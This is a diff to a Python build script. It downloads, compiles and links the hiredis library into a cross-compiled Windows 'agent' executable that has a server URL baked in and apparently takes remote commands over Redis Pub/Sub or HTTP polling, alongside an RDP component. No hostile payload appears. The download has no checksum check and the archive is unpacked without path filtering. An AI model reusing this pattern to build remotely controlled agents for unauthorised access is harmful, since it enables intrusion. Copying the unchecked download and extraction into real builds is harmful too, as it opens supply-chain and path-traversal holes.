@@ -6,6 +6,8 @@ import sys
 import platform
 import shutil
 from pathlib import Path
+import urllib.request
+import tarfile
 
 PROJECT_ROOT = Path(__file__).resolve().parent.parent
 sys.path.insert(0, str(PROJECT_ROOT))
@@ -30,6 +32,8 @@ AsyncSessionLocal = async_sessionmaker(
 CPP_AGENT_DIR = PROJECT_ROOT / "builder_cpp" / "agent"
 DIST_DIR = PROJECT_ROOT / "dist" / "agents"
 DIST_DIR.mkdir(parents=True, exist_ok=True)
+VENDOR_DIR = PROJECT_ROOT / "builder_cpp" / "vendor"
+VENDOR_DIR.mkdir(parents=True, exist_ok=True)
 
 FFMPEG_SOURCE = PROJECT_ROOT / "dist" / "ffmpeg.exe"
 
@@ -41,6 +45,11 @@ if CURRENT_OS == "Windows":
     GXX = "C:/msys64/ucrt64/bin/g++.exe"
 else:
     GXX = "x86_64-w64-mingw32-g++"
+
+# Redis C++ library (hiredis)
+HIREDIS_VERSION = "1.2.0"
+HIREDIS_DIR = VENDOR_DIR / f"hiredis-{HIREDIS_VERSION}"
+HIREDIS_LIB = HIREDIS_DIR / "hiredis.a"
 
 
 def increment_build_slug(last_slug: str | None) -> str:
@@ -61,12 +70,90 @@ def sha256_file(path: Path) -> str:
     return h.hexdigest()
 
 
+def ensure_hiredis():
+    """Download and compile hiredis if not already compiled"""
+    if HIREDIS_LIB.exists():
+        print(f"[i] hiredis already compiled: {HIREDIS_LIB}")
+        return HIREDIS_LIB
+
+    print(f"[+] Preparing hiredis v{HIREDIS_VERSION}")
+
+    # Download hiredis
+    if not HIREDIS_DIR.exists():
+        url = f"https://github.com/redis/hiredis/archive/v{HIREDIS_VERSION}.tar.gz"
+        tar_path = VENDOR_DIR / f"hiredis-{HIREDIS_VERSION}.tar.gz"
+        print(f"[+] Downloading hiredis from {url}")
+        try:
+            urllib.request.urlretrieve(url, str(tar_path))
+            with tarfile.open(tar_path, "r:gz") as tar:
+                tar.extractall(str(VENDOR_DIR))
+            tar_path.unlink()
+            print(f"[+] Extracted hiredis to {HIREDIS_DIR}")
+        except Exception as e:
+            print(f"[!] Failed to download hiredis: {e}")
+            return None
+
+    # Compile hiredis manually without strict error flags
+    print(f"[+] Compiling hiredis with x86_64-w64-mingw32-gcc (C compiler)")
+    
+    gcc_path = GXX.replace("g++", "gcc")  # Convert to gcc path
+    ar_path = "x86_64-w64-mingw32-ar"
+    
+    # Compile individual hiredis source files (Windows compatibility added in net.c)
+    src_files = ["alloc.c", "net.c", "hiredis.c", "read.c", "sds.c"]
+    obj_files = []
+    
+    try:
+        for src in src_files:
+            src_path = HIREDIS_DIR / src
+            obj_path = HIREDIS_DIR / src.replace(".c", ".o")
+            
+            if obj_path.exists():
+                print(f"[i] {src} already compiled")
+                obj_files.append(obj_path)
+                continue
+            
+            # Compile with minimal flags to avoid -Werror issues
+            compile_cmd = [
+                gcc_path,
+                "-std=c99",
+                "-O2",
+                "-fPIC",
+                "-c",
+                str(src_path),
+                "-o", str(obj_path),
+            ]
+            
+            print(f"[+] Compiling {src}...")
+            subprocess.run(compile_cmd, check=True, cwd=str(HIREDIS_DIR))
+            obj_files.append(obj_path)
+        
+        # Create static library
+        ar_cmd = [ar_path, "rcs", str(HIREDIS_LIB)] + [str(o) for o in obj_files]
+        print(f"[+] Creating static library with {ar_path}...")
+        subprocess.run(ar_cmd, check=True, cwd=str(HIREDIS_DIR))
+        
+        if HIREDIS_LIB.exists():
+            print(f"[+] hiredis compiled successfully: {HIREDIS_LIB}")
+            return HIREDIS_LIB
+        else:
+            print(f"[!] hiredis.a not created")
+            return None
+            
+    except Exception as e:
+        print(f"[!] Failed to compile hiredis: {e}")
+        return None
+
+
 def build_exe(build_slug: str, server_url: str) -> Path:
     output_exe = DIST_DIR / f"agent_universal_{build_slug}.exe"
     DIST_DIR.mkdir(parents=True, exist_ok=True)
 
     print(f"[+] Building {output_exe.name}")
     print(f"[i] Compiler: {GXX}  Platform: {CURRENT_OS}")
+
+    # Ensure hiredis is available
+    hiredis_lib = ensure_hiredis()
 
     cmd = [
         GXX,
@@ -76,8 +163,25 @@ def build_exe(build_slug: str, server_url: str) -> Path:
         str(output_exe),
         f'-DSERVER_URL="{server_url}"',
         f'-DBUILD_SLUG="{build_slug}"',
+        f'-I{HIREDIS_DIR}',  # Include hiredis headers
         str(CPP_ENTRYPOINT),
         str(CPP_RDP_AGENT),
+    ]
+
+    # Add hiredis library if compiled successfully
+    if hiredis_lib and hiredis_lib.exists():
+        cmd.insert(2, "-DHAVE_REDIS")  # Define HAVE_REDIS for conditional compilation
+        cmd.append(f'-L{hiredis_lib.parent}')  # Library path
+        # Use -l:filename instead of -l prefix because hiredis.a doesn't follow libXXX.a convention
+        cmd.append("-l:hiredis.a")
+        print(f"[i] Linking against hiredis: {hiredis_lib}")
+        print(f"[i] Redis Pub/Sub support ENABLED")
+    else:
+        print(f"[!] WARNING: hiredis not available, Redis Pub/Sub support DISABLED")
+        print(f"[i] Will use HTTP polling fallback for commands (30s interval)")
+
+    # Standard Windows libs
+    cmd.extend([
         "-lwinhttp",
         "-lws2_32",
         "-ladvapi32",
@@ -87,7 +191,7 @@ def build_exe(build_slug: str, server_url: str) -> Path:
         "-lwtsapi32",
         "-luserenv",
         "-static",
-    ]
+    ])
 
     if output_exe.exists():
         try:
